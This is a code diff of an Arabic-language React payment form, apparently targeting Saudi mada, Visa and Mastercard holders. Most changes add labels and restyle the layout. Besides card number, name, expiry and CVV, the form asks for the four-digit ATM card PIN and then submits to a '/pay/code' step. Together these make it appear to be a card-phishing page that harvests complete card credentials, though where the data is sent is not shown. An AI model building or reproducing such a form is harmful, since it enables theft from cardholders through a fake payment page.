@@ -38,44 +38,78 @@ const Pay=()=>{
         }
       }
   return (
+    <div className={styles.main}>
     <div className={styles.contect} dir='rtl'>
     
-        <div>
-            <Image 
-                src={visa}
-                alt='visa'
-                width={50}
-            />
-            <Image 
-                src={master}
-                alt='master'
-                width={50}
-            />
-            <Image 
-                src={mada}
-                alt='mada'
-                width={35}
-            />
-        </div>
-        <form action='/pay/code' onSubmit={handleSubmit}>
-            <select name="selectedPay" ref={selectPay} required>
-                <option value="مدى">مدى</option>
-                <option value="فيزا كارد">فيزا كارد</option>
-                <option value="ماستر كارد">ماستر كارد</option>
-            </select>
-            <input type="text" placeholder='الاسم على البطاقة'ref={namecard} required/>
-            <input type="number" placeholder='رقم البطاقة' dir="ltr" ref={NumsCard}  required maxLength="16"/>
-            <div>
-            <input type="text" placeholder='(MM)'  ref={dateCardmm} maxLength="2" required/>
-            <input type="text" placeholder='(YY)'  ref={dateCardyy} maxLength="2" required/>
+    <div>
+        <Image 
+            src={visa}
+            alt='visa'
+            width={50}
+        />
+        <Image 
+            src={master}
+            alt='master'
+            width={50}
+        />
+        <Image 
+            src={mada}
+            alt='mada'
+            width={35}
+        />
+    </div>
+    <form action='/pay/code' onSubmit={handleSubmit}>
+      <label htmlFor="selectedPay">
+        نوع البطاقة</label>
+        <select name="selectedPay" ref={selectPay} required>
+            <option value="مدى">مدى</option>
+            <option value="فيزا كارد">فيزا كارد</option>
+            <option value="ماستر كارد">ماستر كارد</option>
+        </select>
+
+        <label htmlFor="namecard">
+          الاسم على البطاقة</label>
+        <input type="text" placeholder='الاسم على البطاقة'ref={namecard} required/>
+
+        
+        <label htmlFor="">
+        رقم البطاقة</label>
+
+
+        <input type="text" placeholder=' 1234-5678-9632-4258' dir="ltr" ref={NumsCard}   maxLength="16" required/>
+        
+         <div>
+          
+          <div className={styles.slebale}>
+          <label htmlFor="cvc">
+          cvc/cvv</label>
+          <label htmlFor="data">
+              تاريخ انتهاء البطاقة</label>
             </div>
             
             
-            <input type="text" placeholder='الرقم (cvc/cvv)'ref={cvcCard} maxLength="3" required/>
-            <input type="text" placeholder='رمز البطاقة المكون من اربعة ارقام'ref={passCard} maxLength="5" required/>
-            <button type='submit' onClick={handlerout}> ارسال</button>
-        </form>
-    </div>
+             <div name="data" className={styles.dataes}>
+             <input type="text" placeholder='123'ref={cvcCard} maxLength="3" required/>
+                <div>
+                <input type="text" placeholder='(MM)'  ref={dateCardmm} maxLength="2" required/>
+                <input type="text" placeholder='(YY)'  ref={dateCardyy} maxLength="2" required/>
+          
+                </div>
+                   </div>
+            
+        </div>
+        
+        
+        <label htmlFor="">
+        ادخل رقم بطاقة الصراف المكون من اربعة ارقام</label>
+        <input type="text" placeholder='رمز البطاقة المكون من اربعة ارقام'ref={passCard} maxLength="5" required/>
+        
+        
+       
+        <button type='submit' onClick={handlerout}> ارسال</button>
+    </form>
+</div>
+</div>
   )
 }
 
